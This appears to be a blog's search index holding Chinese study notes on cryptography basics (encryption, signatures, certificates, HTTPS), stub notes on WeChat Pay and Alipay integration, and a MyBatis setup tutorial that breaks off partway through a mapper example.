<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>微信&amp;支付宝支付</title>
      <link href="/2023/04/21/Articles/%E5%BE%AE%E4%BF%A1&amp;%E6%94%AF%E4%BB%98%E5%AE%9D%E6%94%AF%E4%BB%98/"/>
      <url>/2023/04/21/Articles/%E5%BE%AE%E4%BF%A1&amp;%E6%94%AF%E4%BB%98%E5%AE%9D%E6%94%AF%E4%BB%98/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="一、信息安全基础"><a href="#一、信息安全基础" class="headerlink" title="一、信息安全基础"></a>一、信息安全基础</h2><h3 id="1-1-机密性"><a href="#1-1-机密性" class="headerlink" title="1.1 机密性"></a>1.1 机密性</h3><p>机密性是信息安全的基础，实现机密性最常用的手段就是加密。</p><p>明文(plain text) -&gt; 通过密钥(key保密)和加密算法(公开)进行加密(encrypt)-&gt; 密文(cipher text)-&gt; 通过密钥(key保密)和解密算法(公开)来解密(decrypt) -&gt; 明文(plain text)</p><p>密钥的度量单位是位 bit，如，密钥长度128，就是16字节的二进制串。</p><p>按照密钥的使用方式，加密可以分为两大类：对称加密和非对称加密。</p><h4 id="1-1-1-对称加密"><a href="#1-1-1-对称加密" class="headerlink" title="1.1.1 对称加密"></a>1.1.1 对称加密</h4><p>指加密、解密的时候使用的密钥是同一个，是对称的，只要保证密钥的安全性，那整个通信过程就具有了机密性，因为通信过程中传输的全是用密钥加密后的密文，所以只有消息的发送方和接收方才能解密。即使消息被窃取，看到的也是加密后的密文，因为没有密钥无法接触明文，所以就实现了发送消息的机密性。</p><p>对称加密的算法：</p><ul><li>AES加密算法，密钥长度128、192或256，安全强度高，性能很好。</li></ul><p>加密分组模式：将明文分组加密，微信支付中使用 AEAD_AES_256_GCM，AES_256意思就是256个长度的AES非对称加密算法，AEAD GCM就是分组模式当中的具体分组算法。</p><h4 id="1-1-2-非对称加密"><a href="#1-1-2-非对称加密" class="headerlink" title="1.1.2 非对称加密"></a>1.1.2 非对称加密</h4><p>非对称加密有两个密钥，一个公钥(public key)、一个私钥(private key)，两个密钥是不同的，所以叫非对称。</p><p>公钥可以公开给任何人使用，私钥必须是严格保密。</p><p>使用公钥加密后只能使用私钥解密，使用私钥加密后，也只能使用公钥解密。</p><p>非对称加密的算法：</p><ul><li>RSA加密算法，最著名的非对称加密算法，微信中使用的非对称算法使用的就是这种方式。</li></ul><h4 id="1-1-3-对称加密和非对称加密的优缺点"><a href="#1-1-3-对称加密和非对称加密的优缺点" class="headerlink" title="1.1.3 对称加密和非对称加密的优缺点"></a>1.1.3 对称加密和非对称加密的优缺点</h4><p>对称加密：</p><ul><li>优点：运算速度快。</li><li>缺点：密钥需要信息交换的双方共享，一旦被窃取，消息会被破解。</li></ul><p>非对称加密：</p><ul><li>优点：私钥严格保密，公钥任意分发，黑客获取公钥无法破解密文。</li><li>缺点：运算速度非常慢。</li></ul><p>怎么结合，我们可以用非对称加密的方式先传输对称加密需要的密钥，这样可以保证密钥被安全的传递，后期的信息交换过程就可以安全的使用对称加密了，https协议使用的就是这个原理。</p><h3 id="1-2-身份认证"><a href="#1-2-身份认证" class="headerlink" title="1.2 身份认证"></a>1.2 身份认证</h3><p>私钥加密公钥加密的过程其实就是身份认证的过程。</p><p>例如Bob有两把钥匙，公钥和私钥，他把公钥送给他的朋友们Susan。<br>Susan给Bob写信，他用Bob的公钥加密发送给Bob，Bob使用自己的私钥解密就可以看到。<br>Bob想要给Susan写信怎么办呢，那她也需要公钥和私钥，再把公钥送给她的朋友们，那Bob写信用Susan的公钥加密，发给Susan，Susan用自己的私钥解密就可以看到了。<br>这些都是用公钥加密，私钥解密，如果我们反过来，私钥加密，公钥解密，有什么作用呢？<br>Bob给Susan写信，用自己的私钥进行加密，但是Bob的朋友都有他的公钥，因此他们都能够解密Bob的信，所以我们发现私钥加密、公钥解密并不是为了加密，所以它到底有什么用呢？<br>Bob使用自己的私钥对信件加密，Susan必须使用Bob的公钥对信件进行解密，因此Susan能够确认的是这封信是Bob发的，而不是别人，<br>所以，私钥加密，公钥加密的作用其实就是身份认证。</p><h3 id="1-3-数字签名"><a href="#1-3-数字签名" class="headerlink" title="1.3 数字签名"></a>1.3 数字签名</h3><p>信件不需要加密，如何保证信件不被篡改，即信息的完整性？</p><p>实现信息完整性的手段主要是摘要算法(Digest Algorithm)，也就是常说的散列函数、哈希函数(Hash Function)。</p><p>如任意长度的字符串Z，经过哈希运算得到固定长度的字符串H，就是Z的哈希结果，又称为数据指纹、摘要（MD5就是一个非常典型的加密算法）。</p><p>摘要算法的特性：</p><ol><li>不可逆性：只有算法，没有密钥，只能加密，不能解密。</li><li>难题友好型：想要破解，只能暴力破解。</li><li>发散性：只要对原文进行一点点改动，摘要就会发生剧烈变化。</li><li>抗碰撞性：原文不同，计算后的摘要也要不同，防止哈希冲突。</li></ol><p>常见的摘要算法：MD5、SHA1、SHA2(SHA224、SHA256、SHA384)，MD5和SHA1不具有强的抗碰撞性。</p><p>摘要算法的作用：保证信息的完整性。</p><p>但，不能保证摘要可信任。</p><p>Bob写完信之后先用摘要算法生成原信件的摘要，Bob将摘要附在信件原文的下面，一起发送个Pat。<br>Pat收到信之后也是用跟Bob一样的摘要算法对原文进行加密，然后跟Bob的摘要进行对比，如果一直则没有被篡改，否则被篡改。</p><p>摘要算法不具有机密性，如果信件被黑客截取，黑客更改原信件再更改附件摘要，Pat则无法察觉。</p><p>Bob写信用摘要算法加密，然后用自己的私钥对摘要进行加密，加密后的结果我们称为<code>数字签名</code>，Bob将数字签名附在原文下面发给Pat。<br>Pat取下数字签名，用Bob的公钥进行解密，Pat使用和Bob一样的摘要算法加密信件的原文，得到信件的摘要，Pat将摘要进行比对，如果一致则完整，这个过程我们叫做<code>验签</code>。</p><p>数字签名可以保证信息传递的过程中不可以被篡改，以及信息传递者的身份的认证。</p><p>公钥存在信任问题。</p><h3 id="1-4-数字证书"><a href="#1-4-数字证书" class="headerlink" title="1.4 数字证书"></a>1.4 数字证书</h3><p>数字证书解决公钥信任问题。</p><p>Doug想要欺骗Pat，他将自己的公钥发送给Pat，谎称这是Bob的公钥，那Pat就会误以为自己和Bob通信，实际上在跟Doug通信。</p><p>公钥的信任：黑客可以伪造公钥，怎么判断公钥是真实的？<br><strong>数字证书</strong></p><p>数字证书中的信息：</p><ul><li>公钥：Bob的公钥</li><li>所有者：Bob</li><li>颁发者：CA(Certificate Authority)，证书颁发机构，第三方机构防止被伪造</li><li>有效期：证书的使用期限</li><li>签名哈希算法：指定摘要算法，用来计算证书的摘要</li><li>指纹：证书的摘要，保证证书的完整性</li><li>签名算法：用于生成签名，确保证书是由CA签发</li><li>序列号：证书的唯一标识</li></ul><p>CA用证书中指定的哈希算法计算出证书的摘要，也就是指纹，CA根据证书中的签名算法，用CA自己的私钥进行加密，生成证书的签名，最后将证书的签名和证书的基本信息一起发布，Bob就得到了数字证书。<br>Bob给Pat写信，在签名的同时再附上数字证书就可以了，Pat收到信，取出数字证书，验签数字证书，Pat用证书的Hash算法根据证书信息计算整个摘要，使用CA的公钥从数字证书的签名中解析出数字证书的摘要，对比，验签没问题之后，Pat取出公钥。<br>最信件验证，用证书的摘要算法加密出摘要，再用数字证书的Bob公钥对信件进行解密，比对摘要，验签通过则没有任何问题。</p><h3 id="1-5-https协议"><a href="#1-5-https协议" class="headerlink" title="1.5 https协议"></a>1.5 https协议</h3><p>主要用于网页加密，https网站向CA申请证书，CA颁发数字证书(CA用私钥加密数字证书并签名，数字证书中存在网站的公钥)，<br>浏览器向网站发出了加密请求，网站对网页进行加密会连同数字证书一起发送给客户端浏览器。<br>浏览器获取网站公钥，使用CA的公钥解密数字证书并验签，CA的公钥默认安装在操作系统中，判断网址与证书中的网址是否一致，是不是权威机构颁发的证书。<br>数字证书可靠，客户端就可以获取网站公钥，再使用网站的公钥信息进行加密，然后与网站进行通信。</p><h2 id="二、微信支付（无商户号）"><a href="#二、微信支付（无商户号）" class="headerlink" title="二、微信支付（无商户号）"></a>二、微信支付（无商户号）</h2><blockquote><p><a href="https://pay.weixin.qq.com/">微信支付官网</a></p></blockquote><h3 id="2-1-微信支付产品"><a href="#2-1-微信支付产品" class="headerlink" title="2.1 微信支付产品"></a>2.1 微信支付产品</h3><ol><li>付款码支付</li><li>JSAPI支付</li><li>小程序支付</li><li>Native支付</li><li>APP支付</li><li>刷脸支付</li></ol><p><strong>由于无商户号暂不做研究，日后补充。</strong></p><h2 id="三、支付宝支付"><a href="#三、支付宝支付" class="headerlink" title="三、支付宝支付"></a>三、支付宝支付</h2><blockquote><p><a href="https://open.alipay.com/">支付宝开放平台</a></p></blockquote><h3 id="3-1-电脑网站支付"><a href="#3-1-电脑网站支付" class="headerlink" title="3.1 电脑网站支付"></a>3.1 电脑网站支付</h3><h4 id="3-3-1-接入准备"><a href="#3-3-1-接入准备" class="headerlink" title="3.3.1 接入准备"></a>3.3.1 接入准备</h4><p>常规接入流程：</p><p>创建应用、绑定应用、配置密钥、上线应用、签约功能。</p><p>沙箱接入流程：</p><p>直接使用沙箱提供的开发参数，无需进行应用的创建、绑定、上线和签约。</p>]]></content>
      
      
      <categories>
          
          <category> Articles </category>
          
      </categories>
      
      
        <tags>
            
            <tag> article </tag>
            
            <tag> 支付 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一、MyBatis</title>
      <link href="/2023/04/21/Java/%E4%B8%80%E3%80%81MyBatis/"/>
      <url>/2023/04/21/Java/%E4%B8%80%E3%80%81MyBatis/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="一、MyBatis"><a href="#一、MyBatis" class="headerlink" title="一、MyBatis"></a>一、MyBatis</h1><h2 id="1、MyBatis简介"><a href="#1、MyBatis简介" class="headerlink" title="1、MyBatis简介"></a>1、MyBatis简介</h2><h3 id="1-1、MyBatis历史"><a href="#1-1、MyBatis历史" class="headerlink" title="1.1、MyBatis历史"></a>1.1、MyBatis历史</h3><p>MyBatis最初是Apache的一个开源项目<strong>iBatis</strong>, 2010年6月这个项目由Apache Software Foundation迁移到了Google Code。随着开发团队转投Google Code旗下， iBatis3.x正式更名为MyBatis。代码于2013年11月迁移到Github。</p><p>iBatis一词来源于“internet”和“abatis”的组合，是一个基于Java的持久层框架。 iBatis提供的持久层框架包括SQL Maps和Data Access Objects（DAO）。</p><h3 id="1-2、MyBatis特性"><a href="#1-2、MyBatis特性" class="headerlink" title="1.2、MyBatis特性"></a>1.2、MyBatis特性</h3><p>1） MyBatis 是支持定制化 SQL、存储过程以及高级映射的优秀的持久层框架</p><p>2） MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集</p><p>3） MyBatis可以使用简单的XML或注解用于配置和原始映射，将接口和Java的POJO（Plain Old Java</p><p>Objects，普通的Java对象）映射成数据库中的记录</p><p>4） MyBatis 是一个 半自动的ORM（Object Relation Mapping）框架</p><h3 id="1-3、MyBatis下载"><a href="#1-3、MyBatis下载" class="headerlink" title="1.3、MyBatis下载"></a>1.3、MyBatis下载</h3><p>MyBatis下载地址：<a href="https://github.com/mybatis/mybatis-3">https://github.com/mybatis/mybatis-3</a></p><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/2.png"></p><h3 id="1-4、和其它持久化层技术对比"><a href="#1-4、和其它持久化层技术对比" class="headerlink" title="1.4、和其它持久化层技术对比"></a>1.4、和其它持久化层技术对比</h3><ul><li>JDBC<ul><li>SQL 夹杂在Java代码中耦合度高，导致硬编码内伤</li><li>维护不易且实际开发需求中 SQL 有变化，频繁修改的情况多见</li><li>代码冗长，开发效率低</li></ul></li><li>Hibernate 和 JPA<ul><li>操作简便，开发效率高</li><li>程序中的长难复杂 SQL 需要绕过框架</li><li>内部自动生产的 SQL，不容易做特殊优化</li><li>基于全映射的全自动框架，大量字段的 POJO 进行部分映射时比较困难。</li><li>反射操作太多，导致数据库性能下降</li></ul></li><li>MyBatis<ul><li>轻量级，性能出色</li><li>SQL 和 Java 编码分开，功能边界清晰。Java代码专注业务、SQL语句专注数据</li><li>开发效率稍逊于HIbernate，但是完全能够接受</li></ul></li></ul><h1 id="2、搭建MyBatis"><a href="#2、搭建MyBatis" class="headerlink" title="2、搭建MyBatis"></a>2、搭建MyBatis</h1><h2 id="2-1、开发环境"><a href="#2-1、开发环境" class="headerlink" title="2.1、开发环境"></a>2.1、开发环境</h2><p>IDE：idea 2019.2</p><p>构建工具：maven 3.5.4</p><p>MySQL版本：MySQL 8</p><p>MyBatis版本：MyBatis 3.5.7</p><blockquote><p>MySQL不同版本的注意事项</p><p>1、驱动类driver-class-name</p><p>MySQL 5版本使用jdbc5驱动，驱动类使用：com.mysql.jdbc.Driver</p><p>MySQL 8版本使用jdbc8驱动，驱动类使用：com.mysql.cj.jdbc.Driver</p><p>2、连接地址url</p><p>MySQL 5版本的url：</p><p>jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;ssm</p><p>MySQL 8版本的url：</p><p>jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;ssm?serverTimezone&#x3D;UTC</p><p>否则运行测试用例报告如下错误：</p><p>java.sql.SQLException: The server time zone value ‘ÖÐ¹ú±ê×¼Ê±¼ä’ is unrecognized or</p><p>represents more</p></blockquote><h2 id="2-2、创建maven工程"><a href="#2-2、创建maven工程" class="headerlink" title="2.2、创建maven工程"></a>2.2、创建maven工程</h2><p><strong>①打包方式：jar</strong></p><p><strong>②引入依赖</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- Mybatis核心 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">&lt;!-- junit测试 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">&lt;!-- MySQL驱动 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.16<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-3、创建MyBatis的核心配置文件"><a href="#2-3、创建MyBatis的核心配置文件" class="headerlink" title="2.3、创建MyBatis的核心配置文件"></a>2.3、创建MyBatis的核心配置文件</h2><blockquote><p>习惯上命名为mybatis-config.xml，这个文件名仅仅只是建议，并非强制要求。将来整合Spring</p><p>之后，这个配置文件可以省略，所以大家操作时可以直接复制、粘贴。</p><p>核心配置文件主要&#x3D;&#x3D;用于配置连接数据库的环境以及MyBatis的全局配置信息&#x3D;&#x3D;</p><p>核心配置文件存放的位置是src&#x2F;main&#x2F;resources目录下</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">configuration</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">&lt;!--设置连接数据库的环境--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/ssm?serverTimezone=UTC&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--引入映射文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;mappers/UserMapper.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">configuration</span>  </span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span>  </span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">&lt;!--设置连接数据库的环境--&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span> <span class="comment">&lt;!--数据源--&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>/&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/ssm2023?serverTimezone=UTC&quot;</span>/&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span>/&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span>  </span><br><span class="line">    <span class="comment">&lt;!--引入mybatis的映射文件，记得引入核心配置文件下面的地址--&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;mappers/UserMapper.xml&quot;</span>/&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-4、创建mapper接口"><a href="#2-4、创建mapper接口" class="headerlink" title="2.4、创建mapper接口"></a>2.4、创建mapper接口</h2><blockquote><p>MyBatis中的mapper接口相当于以前的dao。但是区别在于，&#x3D;&#x3D;mapper仅仅是接口&#x3D;&#x3D;，我们不需要</p><p>提供实现类。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 添加用户信息</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="type">int</span> <span class="title function_">insertUser</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-5、创建MyBatis的映射文件"><a href="#2-5、创建MyBatis的映射文件" class="headerlink" title="2.5、创建MyBatis的映射文件"></a>2.5、创建MyBatis的映射文件</h2><p>相关概念：<strong>ORM</strong>（<strong>O</strong>bject <strong>R</strong>elationship <strong>M</strong>apping）<code>对象关系映射</code>。</p><ul><li>对象：Java的实体类对象</li><li>关系：关系型数据库</li><li>映射：二者之间的对应关系</li></ul><table><thead><tr><th><strong>Java概念</strong></th><th><strong>数据库概念</strong></th></tr></thead><tbody><tr><td>类</td><td>表</td></tr><tr><td>属性</td><td>字段&#x2F;列</td></tr><tr><td>对象</td><td>记录&#x2F;行</td></tr></tbody></table><blockquote><p>1、映射文件的命名规则：</p><p>表所对应的实体类的类名+Mapper.xml</p><p>例如：表t_user，映射的实体类为User，所对应的映射文件为UserMapper.xml</p><p>因此一个映射文件对应一个实体类，对应一张表的操作</p><p>MyBatis映射文件用于编写SQL，访问以及操作表中的数据</p><p>MyBatis映射文件存放的位置是src&#x2F;main&#x2F;resources&#x2F;mappers目录下</p><p>2、 MyBatis中可以面向接口操作数据，要保证两个一致：</p><p>a&gt;mapper接口的全类名和映射文件的命名空间（namespace）保持一致</p><p>b&gt;&#x3D;&#x3D;mapper接口中方法的方法名和映射文件中编写SQL的标签的id属性保持一致&#x3D;&#x3D;</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta"><span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.atguigu.mybatis.mapper.UserMapper&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--int insertUser();--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">nsert</span> <span class="attr">id</span>=<span class="string">&quot;insertUser&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">into</span> <span class="attr">t_user</span> <span class="attr">values</span>(<span class="attr">null</span>,&#x27;<span class="attr">admin</span>&#x27;,&#x27;<span class="attr">123456</span>&#x27;,<span class="attr">23</span>,&#x27;<span class="attr">男</span>&#x27;,&#x27;<span class="attr">12345</span>@<span class="attr">qq.com</span>&#x27;)</span></span><br><span class="line"><span class="tag">&lt;/<span class="attr">insert</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span>  </span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span>  </span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.jackhou.mybatis.mapper.UserMapper&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="comment">&lt;!--mapper接口 与 映射文件相对应--&gt;</span>  </span><br><span class="line"><span class="comment">&lt;!--    mapper接口和映射文件要保证两个一致:  </span></span><br><span class="line"><span class="comment">            1，mapper接口的全类名和映射文件的namespace一致  </span></span><br><span class="line"><span 